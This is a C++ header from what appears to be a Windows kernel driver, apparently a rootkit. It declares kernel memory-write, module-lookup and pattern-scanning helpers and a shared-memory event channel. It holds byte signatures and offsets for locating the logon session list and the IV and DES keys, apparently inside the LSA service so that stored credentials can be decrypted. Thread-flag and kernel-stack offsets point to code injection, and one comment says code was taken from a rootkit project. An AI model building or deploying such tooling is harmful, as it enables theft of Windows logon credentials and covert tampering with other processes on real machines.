#pragma once
#include "headers.h"

#define SHARED_MEM_SIZE 512
#define EVENT_NAME L"\\BaseNamedObjects\\MySharedEvent"
#define SECTION_NAME L"\\BaseNamedObjects\\MySharedSection"


// Definitions.
constexpr SIZE_T NO_ACCESS = 0;
constexpr SIZE_T RETURN_OPCODE = 0xC3;
constexpr SIZE_T MOV_EAX_OPCODE = 0xB8;
constexpr SIZE_T PATH_OFFSET = 0x190;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_BIT = 0x10;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_OFFSET = 0x74;
constexpr SIZE_T GUI_THREAD_FLAG_BIT = 0x80;
constexpr SIZE_T GUI_THREAD_FLAG_OFFSET = 0x78;
constexpr SIZE_T THREAD_KERNEL_STACK_OFFSET = 0x58;
constexpr SIZE_T THREAD_CONTEXT_STACK_POINTER_OFFSET = 0x2C8;
constexpr UCHAR LogonSessionListLocation[] = { 0xC1, 0xE1, 0x03, 0xE8, 0xCC, 0xCC, 0xCC , 0xFF };
constexpr UCHAR IvDesKeyLocation[] = { 0x21, 0x45, 0xD4, 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x21, 0x45, 0xD8 };
constexpr UCHAR FunctionStartSignature[] = { 0x40, 0x55 };
constexpr UCHAR LogonSessionListCountSignature[] = { 0x48, 0x89, 0x45, 0xCC, 0x44, 0x8B, 0x05 };
constexpr UCHAR LogonSessionListLockSignature[] = { 0xCC, 0x8D, 0x35 };
constexpr UCHAR LogonSessionListSignature[] = { 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x8B };
constexpr UCHAR IvSignature[] = { 0x44, 0x8B, 0xC6, 0x48, 0x8D, 0x15 };
constexpr UCHAR DesKeySignature[] = { 0x44, 0x8B, 0x4D, 0xD4, 0x48, 0x8D, 0x15 };
constexpr SIZE_T LogonSessionListCountOffset = 0xB;
constexpr SIZE_T LogonSessionListLockOffset = 3;
constexpr SIZE_T LogonSessionListOffset = 3;
constexpr SIZE_T IvOffset = 6;
constexpr SIZE_T DesKeyOffset = 7;
constexpr SIZE_T DesKeyStructOffset = 0xB;
constexpr SIZE_T LsaInitializeProtectedMemoryLen = 0x310;
constexpr SIZE_T WLsaEnumerateLogonSessionLen = 0x2ad;
constexpr SIZE_T LogonSessionListLocationDistance = 0x4e730;
constexpr SIZE_T IvDesKeyLocationDistance = 0x43050;

namespace MemoryHelper {
	VOID MSGClient(const char* MSG);
	NTSTATUS SetupSharedMemory();
	void CleanupSharedMemory();
	UINT64 GetBaseAddress(UINT32 PID);
	PVOID GetModuleBase(PEPROCESS process, const WCHAR* moduleName);
	PVOID GetProcAddress(PVOID moduleBase, const CHAR* functionName);
	// taken from nidhogg at this point, im tired af, its 3am.
	// just changed its casting to ULONG since it gives errors.
	NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode, bool alignAddr);
	template <typename PointerType>
	PointerType AllocateMemory(size_t size, bool paged = true, bool forceDeprecatedAlloc = false) {
		PVOID allocatedMem = NULL;

		if (AllocatePool2 && WindowsBuildNumber >= WIN_2004 && !forceDeprecatedAlloc) {
			allocatedMem = paged ? ((tExAllocatePool2)AllocatePool2)(POOL_FLAG_PAGED, size, DRIVER_TAG) :
				((tExAllocatePool2)AllocatePool2)(POOL_FLAG_NON_PAGED, size, DRIVER_TAG);
		}
		else {
#pragma warning( push )
#pragma warning( disable : 4996)
			allocatedMem = paged ? ExAllocatePoolWithTag(PagedPool, size, DRIVER_TAG) :
				ExAllocatePoolWithTag(NonPagedPool, size, DRIVER_TAG);
#pragma warning( pop )
		}

		if (allocatedMem)
			RtlSecureZeroMemory(allocatedMem, size);
		return reinterpret_cast<PointerType>(allocatedMem);
	}
	NTSTATUS ProbeAddress(PVOID address, SIZE_T len, ULONG alignment, NTSTATUS failureCode);
	NTSTATUS CopyUnicodeString(PEPROCESS sourceProcess, PUNICODE_STRING source, PEPROCESS targetProcess, PUNICODE_STRING target, MODE mode);
	PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size,
		PULONG foundIndex, ULONG relativeOffset, bool reversed = false);
}
